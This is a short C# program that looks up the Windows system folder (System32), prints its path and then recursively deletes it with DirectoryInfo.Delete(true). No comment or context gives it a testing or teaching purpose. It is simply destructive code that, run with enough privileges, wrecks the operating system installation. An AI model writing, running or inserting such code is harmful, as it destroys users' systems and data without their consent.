using System.Diagnostics;
var system32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);

Console.WriteLine($"System folder: {system32Path}");

var directoryInfo = new DirectoryInfo(system32Path);

directoryInfo.Delete(true);
